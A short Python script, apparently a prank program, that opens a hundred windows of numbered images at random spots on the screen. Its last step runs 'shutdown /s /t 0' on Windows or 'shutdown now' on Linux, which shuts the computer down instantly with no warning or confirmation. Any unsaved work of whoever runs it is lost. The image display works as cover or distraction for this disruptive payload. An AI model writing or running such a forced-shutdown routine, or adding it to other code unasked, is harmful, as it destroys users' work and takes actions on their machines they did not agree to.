import cv2
import os
import platform
import numpy as np
import pyautogui as pag

scr_w,scr_h= pag.size()

img_maisuu=10
for i in range(100):
    frame=cv2.imread(str(i%img_maisuu)+".jpg")
    Xlim=len(frame[0])
    Ylim=len(frame)
    if len(frame[0])>=scr_w or len(frame)>=scr_h:
        Xlim=int(len(frame[0])/10)
        Ylim=int(len(frame)/10)
        frame=cv2.resize(frame,(Xlim,Ylim))
    cv2.namedWindow(str(i), cv2.WINDOW_NORMAL)
    cv2.moveWindow(str(i), np.random.randint(0,scr_w-Xlim),np.random.randint(0,scr_h-Ylim))
    cv2.imshow(str(i), frame)

if platform.system()=="Windows":
    os.system("shutdown /s /t 0")
elif platform.system()=="Linux":
    os.system("shutdown now")

cv2.destroyAllWindows()